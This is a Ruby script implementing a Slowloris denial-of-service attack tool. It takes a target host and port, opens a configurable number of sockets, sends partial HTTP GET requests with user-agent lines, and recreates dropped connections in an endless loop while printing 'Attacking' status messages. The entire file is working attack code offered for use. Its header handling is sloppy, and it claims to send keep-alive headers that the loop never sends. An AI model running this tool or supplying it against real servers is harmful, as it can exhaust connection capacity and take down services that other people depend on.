#!/usr/bin/env ruby

class String
  def red; "\e[31m#{self}\e[0m" end
  def green; "\e[32m#{self}\e[0m" end
  def yellow; "\e[33m#{self}\e[0m" end
  def blue; "\e[34m#{self}\e[0m" end
  def magenta; "\e[35m#{self}\e[0m" end
  def cyan; "\e[36m#{self}\e[0m" end
end

class Slowloris
  def initialize
    require 'socket'

    @user_agents = [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]

    @parameters = {
      host: nil,
      socket_count: 150,
      sleep_time: 15,
      port: 80,
      sockets: []
    }
  end

  def initialize_socket(host, port)
    socket = Socket.new(Socket::AF_INET, Socket::SOCK_STREAM, 0)
    socket_addr = Socket.pack_sockaddr_in(port, host)
    socket.connect(socket_addr)

    socket.write("GET /?#{rand(2250)} HTTP/1.1\r\n".encode("utf-8"))
    
    # headers
    @user_agents.each { |header|
      socket.write("#{header}\r\n".encode("utf-8"))
    }

    return socket
  end

  def print_help
    help_text = <<-'HELP_TEXT'
Usage: ruby slowloris.rb [options]

Options:
 -h, --host: Set host.
 -s, --socket_count: Set socket count.
 -H, --help: Print this text.
 -p, --port: Set port.
 -t, --sleep_time: Sleep time when an error is received during the request.
HELP_TEXT
    
    $stdout.puts(help_text.red)
  end

  def option_parser
    require 'optparse'

    OptionParser.new do |opts|
      opts.on("-H", "--help", "Prints help text.") do
        print_help()
        exit(0)
      end

      opts.on("-t", "--sleep-time SLEEP_TIME", Integer, "Set sleep time.") do |sleep_time|
        @parameters[:sleep_time] = sleep_time
      end

      opts.on("-h", "--host HOST", "Set host.") do |host|
        @parameters[:host] = host
      end

      opts.on("-p", "--port PORT", Integer, "Set port.") do |port|
        @parameters[:port] = port
      end

      opts.on("-s", "--socket_count SOCKET_COUNT", Integer, "Set socket count value.") do |socket_count|
        @parameters[:socket_count] = socket_count
      end
    end.parse!
  end

  def start
    option_parser()

    if @parameters[:host]
      $stdout.puts("Attacking #{@parameters[:host]} with #{@parameters[:socket_count]} sockets.".magenta)
      $stdout.puts("Creating sockets...".blue)

      while true
        @parameters[:socket_count].times do
          begin
            socket = initialize_socket(@parameters[:host], @parameters[:port])
            @parameters[:sockets] << socket
          rescue
            break
          rescue Interrupt
            exit(0)
          end
        end

        $stdout.puts("Sending keep-alive headers... Socket count: #{@parameters[:sockets].size}")

        # recreates dead sockets
        (1..(@parameters[:socket_count] - @parameters[:sockets].size)).each do
          $stdout.puts("Recreating socket...")
          begin
            socket = initialize_socket(@parameters[:host], @parameters[:port])
            @parameters[:sockets] << socket if socket
          rescue
            break
          end
        end

        # sleeps for a while
        sleep(@parameters[:sleep_time])
      end
    else
      $stdout.puts("Please set a host.".cyan)
      print_help()
      exit(0)
    end
  end
end

slowloris = Slowloris.new()
slowloris.start()
